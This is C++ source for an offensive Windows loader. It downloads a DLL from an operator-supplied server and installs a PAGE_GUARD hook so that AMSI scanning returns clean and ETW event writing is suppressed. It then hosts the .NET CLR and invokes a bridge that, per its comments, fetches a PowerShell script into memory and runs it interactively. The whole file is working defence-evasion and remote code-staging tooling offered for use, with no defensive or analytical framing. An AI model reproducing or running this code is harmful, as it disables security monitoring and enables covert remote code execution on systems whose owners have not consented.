// amnesiac_launcher.exe -- PAGE_GUARD AMSI+ETW bypass + in-process PS Runspace loader
//
// Usage: amnesiac_launcher.exe <operator-base-url>
// Example: amnesiac_launcher.exe http://192.168.1.100:8080
//
// Flow:
//   1. Download AmnesiacBridge.dll from operator server
//   2. Install PAGE_GUARD AMSI + ETW bypass (before CLR starts)
//   3. Start CLR via ICLRRuntimeHost (works on .NET 4.x without ICorRuntimeHost)
//   4. Write AmnesiacBridge.dll to a GUID-named temp file (~10KB, deleted on exit)
//   5. ExecuteInDefaultAppDomain -> Launcher.RunFromUrl(baseUrl)
//   6. RunFromUrl downloads Amnesiac_ShellReady.ps1 in managed code (never on disk)
//      and runs it interactively via PS Runspace under the active AMSI bypass

#include <Windows.h>
#include <winhttp.h>
#include <evntprov.h>
#include <metahost.h>
#include <cstdio>
#include <cstring>
#include "bypass.hpp"

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

using FnAmsiScanBuffer = HRESULT(WINAPI*)(PVOID, PVOID, ULONG, LPCWSTR, PVOID, ULONG*);
using FnEtwEventWrite  = ULONG(NTAPI*)(UINT64, PVOID, ULONG, PVOID);

static constexpr ULONG kAmsiClean = 0;

// ---------------------------------------------------------------------------
// WinHTTP download into heap buffer
// ---------------------------------------------------------------------------
static bool HttpDownload(const wchar_t* url, BYTE** ppBuf, DWORD* pLen)
{
    URL_COMPONENTS uc  = {};
    uc.dwStructSize    = sizeof(uc);
    wchar_t host[256]  = {};
    wchar_t path[1024] = {};
    uc.lpszHostName    = host; uc.dwHostNameLength  = _countof(host);
    uc.lpszUrlPath     = path; uc.dwUrlPathLength   = _countof(path);

    if (!WinHttpCrackUrl(url, 0, 0, &uc)) { printf("[-] CrackUrl: %lu\n", GetLastError()); return false; }

    HINTERNET hSes = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) { printf("[-] WinHttpOpen\n"); return false; }

    HINTERNET hCon = WinHttpConnect(hSes, host, uc.nPort, 0);
    if (!hCon) { WinHttpCloseHandle(hSes); printf("[-] WinHttpConnect\n"); return false; }

    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hCon, L"GET", path, nullptr,
                                         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return false; }

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, nullptr))
    {
        printf("[-] HTTP request failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
        return false;
    }

    DWORD status = 0, statusLen = sizeof(status);
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusLen,
                        WINHTTP_NO_HEADER_INDEX);
    if (status != 200) { printf("[-] HTTP %lu\n", status); WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); return false; }

    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 1);
    DWORD total = 0, avail = 0;
    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0)
    {
        BYTE* nb = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, buf, total + avail + 1);
        if (!nb) break;
        buf = nb;
        DWORD read = 0;
        WinHttpReadData(hReq, buf + total, avail, &read);
        total += read;
    }
    buf[total] = 0;
    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
    if (total == 0) { HeapFree(GetProcessHeap(), 0, buf); return false; }
    *ppBuf = buf; *pLen = total;
    return true;
}

static bool BuildUrl(const wchar_t* base, const wchar_t* file, wchar_t* out, int cch)
{
    int blen = (int)wcslen(base);
    if (blen == 0 || blen >= cch - 2) return false;
    wcsncpy_s(out, cch, base, blen);
    if (out[blen - 1] == L'/') out[--blen] = L'\0';
    wcscat_s(out, cch, L"/");
    wcscat_s(out, cch, file);
    return true;
}

// ---------------------------------------------------------------------------
// wmain
// ---------------------------------------------------------------------------
int wmain(int argc, wchar_t* argv[])
{
    printf("[*] Amnesiac Launcher -- AMSI+ETW bypass + in-process PS Runspace\n\n");

    if (argc < 2)
    {
        printf("Usage: amnesiac_launcher.exe <operator-base-url>\n");
        printf("  e.g.: amnesiac_launcher.exe http://192.168.1.100:8080\n");
        return 1;
    }

    // -------------------------------------------------------------------
    // 1. Resolve AMSI + ETW pointers
    // -------------------------------------------------------------------
    HMODULE hAmsi  = LoadLibraryW(L"amsi.dll");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hAmsi || !hNtdll) { printf("[-] LoadLibrary failed\n"); return 1; }

    auto fnScan = (FnAmsiScanBuffer)GetProcAddress(hAmsi, "AmsiScanBuffer");
    auto fnEtw  = (FnEtwEventWrite) GetProcAddress(hNtdll, "EtwEventWrite");
    if (!fnScan || !fnEtw) { printf("[-] GetProcAddress failed\n"); return 1; }

    // -------------------------------------------------------------------
    // 2. Download AmnesiacBridge.dll
    // -------------------------------------------------------------------
    wchar_t bridgeUrl[1024] = {};
    if (!BuildUrl(argv[1], L"AmnesiacBridge.dll", bridgeUrl, _countof(bridgeUrl)))
    { printf("[-] Invalid base URL\n"); return 1; }

    BYTE* bridgeBytes = nullptr; DWORD bridgeLen = 0;
    printf("[*] Downloading AmnesiacBridge.dll...\n");
    if (!HttpDownload(bridgeUrl, &bridgeBytes, &bridgeLen))
    { printf("[-] Bridge download failed\n"); return 1; }
    printf("[+] Bridge: %lu bytes\n", bridgeLen);

    // -------------------------------------------------------------------
    // 3. Install AMSI + ETW bypass BEFORE CLR starts
    // -------------------------------------------------------------------
    AddBypassTarget((PVOID)fnScan, S_OK, 6, kAmsiClean);
    AddBypassTarget((PVOID)fnEtw, ERROR_SUCCESS);
    if (!InstallBypass())
    {
        printf("[-] Bypass installation failed\n");
        HeapFree(GetProcessHeap(), 0, bridgeBytes);
        return 1;
    }
    printf("[+] AMSI + ETW bypass active\n");

    // -------------------------------------------------------------------
    // 4. Start CLR via ICLRRuntimeHost (.NET 4.x compatible)
    // -------------------------------------------------------------------
    ICLRMetaHost* pMeta = nullptr;
    HRESULT hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMeta);
    if (FAILED(hr)) { printf("[-] CLRCreateInstance: 0x%08X\n", hr); UninstallBypass(); HeapFree(GetProcessHeap(), 0, bridgeBytes); return 1; }

    IEnumUnknown* pEnum = nullptr;
    pMeta->EnumerateInstalledRuntimes(&pEnum);
    ICLRRuntimeInfo* pInfo = nullptr;
    { IUnknown* pUnk = nullptr;
      while (pEnum->Next(1, &pUnk, nullptr) == S_OK)
      { if (pInfo) pInfo->Release(); pUnk->QueryInterface(IID_PPV_ARGS(&pInfo)); pUnk->Release(); }
      pEnum->Release(); }
    if (!pInfo) { printf("[-] No .NET runtime found\n"); pMeta->Release(); UninstallBypass(); HeapFree(GetProcessHeap(), 0, bridgeBytes); return 1; }

    WCHAR ver[64] = {}; DWORD vl = _countof(ver);
    pInfo->GetVersionString(ver, &vl);
    printf("[+] CLR: %ls\n", ver);

    ICLRRuntimeHost* pHost = nullptr;
    hr = pInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&pHost);
    if (FAILED(hr)) { printf("[-] GetInterface(ICLRRuntimeHost): 0x%08X\n", hr); pInfo->Release(); pMeta->Release(); UninstallBypass(); HeapFree(GetProcessHeap(), 0, bridgeBytes); return 1; }

    hr = pHost->Start();
    if (FAILED(hr) && hr != S_FALSE) { printf("[-] CLR Start: 0x%08X\n", hr); pHost->Release(); pInfo->Release(); pMeta->Release(); UninstallBypass(); HeapFree(GetProcessHeap(), 0, bridgeBytes); return 1; }
    printf("[+] CLR ready\n");

    // -------------------------------------------------------------------
    // 5. Write AmnesiacBridge.dll to GUID-named temp file
    //    (10 KB generic Runspace host — no payload content on disk)
    // -------------------------------------------------------------------
    wchar_t tmpDir[MAX_PATH] = {}, tmpFile[MAX_PATH] = {};
    GetTempPathW(_countof(tmpDir), tmpDir);

    GUID g; CoCreateGuid(&g);
    swprintf_s(tmpFile, _countof(tmpFile),
        L"%s%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X.dll",
        tmpDir, g.Data1, g.Data2, g.Data3,
        g.Data4[0], g.Data4[1], g.Data4[2], g.Data4[3],
        g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7]);

    HANDLE hf = CreateFileW(tmpFile, GENERIC_WRITE, 0, nullptr,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE)
    { printf("[-] TempFile: %lu\n", GetLastError()); pHost->Release(); pInfo->Release(); pMeta->Release(); UninstallBypass(); HeapFree(GetProcessHeap(), 0, bridgeBytes); return 1; }

    DWORD written = 0;
    WriteFile(hf, bridgeBytes, bridgeLen, &written, nullptr);
    CloseHandle(hf);
    HeapFree(GetProcessHeap(), 0, bridgeBytes);
    bridgeBytes = nullptr;

    // -------------------------------------------------------------------
    // 6. Remove native PAGE_GUARD bypass before entering managed code.
    //    The CLR's managed-to-unmanaged transition frame is incompatible
    //    with VEH context manipulation — it causes an uncatchable
    //    AccessViolationException inside rs.Open() if left active.
    //    AmnesiacBridge applies managed AMSI+ETW bypasses instead.
    // -------------------------------------------------------------------
    UninstallBypass();

    // -------------------------------------------------------------------
    // 7. ExecuteInDefaultAppDomain -> Launcher.RunFromUrl(baseUrl)
    //    RunFromUrl downloads Amnesiac_ShellReady.ps1 in managed code (no disk)
    //    and runs it interactively — blocks until the user exits Amnesiac
    // -------------------------------------------------------------------
    printf("[+] Bridge staged -- invoking Amnesiac...\n\n");

    DWORD retVal = 0;
    hr = pHost->ExecuteInDefaultAppDomain(
        tmpFile,
        L"AmnesiacBridge.Launcher",
        L"RunFromUrl",
        argv[1],
        &retVal);

    if (FAILED(hr))
        printf("[-] ExecuteInDefaultAppDomain: 0x%08X\n", hr);

    // -------------------------------------------------------------------
    // 8. Cleanup
    // -------------------------------------------------------------------
    DeleteFileW(tmpFile);
    pHost->Release();
    pInfo->Release();
    pMeta->Release();

    return FAILED(hr) ? 1 : 0;
}
